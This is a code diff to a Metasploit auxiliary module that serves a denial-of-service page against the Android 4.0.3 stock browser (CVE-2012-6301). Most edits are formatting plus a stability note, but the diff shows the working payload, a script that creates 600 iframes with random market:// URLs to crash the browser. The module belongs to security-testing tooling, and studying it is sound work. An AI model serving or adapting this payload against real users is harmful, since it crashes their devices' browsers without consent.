@@ -10,24 +10,29 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "Android Stock Browser Iframe DOS",
-        'Description'    => %q(
+        'Name' => 'Android Stock Browser Iframe DOS',
+        'Description' => %q{
           This module exploits a vulnerability in the native browser that comes with Android 4.0.3.
           If successful, the browser will crash after viewing the webpage.
-        ),
-        'License'        => MSF_LICENSE,
-        'Author'         => [
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Jean Pascal Pereira',  # Original exploit discovery
           'Jonathan Waggoner'     # Metasploit module
         ],
-        'References'     => [
+        'References' => [
           [ 'PACKETSTORM', '118539'],
           [ 'CVE', '2012-6301' ]
         ],
         'DisclosureDate' => '2012-12-01',
-        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],
         'PassiveActions' => [ 'WebServer' ],
-        'DefaultAction'  => 'WebServer'
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -44,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
       for (var i = 0; i < 600; i++)
       {
         var m_frame = document.createElement("iframe");
-        m_frame.setAttribute("src", "market://#{Rex::Text.rand_text_alpha(rand(16) + 1)}");
+        m_frame.setAttribute("src", "market://#{Rex::Text.rand_text_alpha(1..16)}");
         document.body.appendChild(m_frame);
       }
     </script>
